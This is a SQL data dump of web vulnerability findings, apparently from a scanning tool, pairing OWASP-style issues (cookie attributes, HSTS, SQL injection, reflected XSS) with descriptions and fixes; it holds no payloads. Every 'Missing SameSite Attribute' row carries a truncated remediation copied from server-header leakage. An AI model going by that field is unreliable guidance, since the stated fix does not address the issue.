(545, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 127, 'Low'),
(546, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 127, 'Low'),
(547, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 127, 'Low'),
(548, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 127, 'Low'),
(549, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 130, 'High'),
(550, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 130, 'Medium'),
(551, 'Missing HttpOnly Attribute in Cookie Header', 'The HttpOnly attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.', 'Implement HttpOnly Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 130, 'Low'),
(552, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 130, 'Low'),
(553, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 131, 'High'),
(554, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 131, 'Medium'),
(555, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 131, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(556, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 131, 'Low'),
(557, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 131, 'Low'),
(558, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 131, 'Low'),
(559, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 131, 'Low'),
(560, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 132, 'High'),
(561, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 132, 'Low'),
(562, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 132, 'Low'),
(563, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 132, 'Low'),
(564, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 132, 'Low'),
(571, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 133, 'High'),
(572, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 133, 'Medium'),
(573, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 133, 'Low'),
(574, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 133, 'Low'),
(575, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 133, 'Low'),
(576, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 133, 'Low'),
(577, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 134, 'High'),
(578, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 134, 'Medium'),
(579, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 134, 'Low'),
(580, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 134, 'Low'),
(581, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 134, 'Low'),
(582, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 134, 'Low'),
(583, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 135, 'High'),
(584, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 135, 'Medium'),
(585, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 135, 'Low'),
(586, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 135, 'Low'),
(587, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 135, 'Low'),
(588, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 135, 'Low'),
(589, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 136, 'High'),
(590, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 136, 'Medium'),
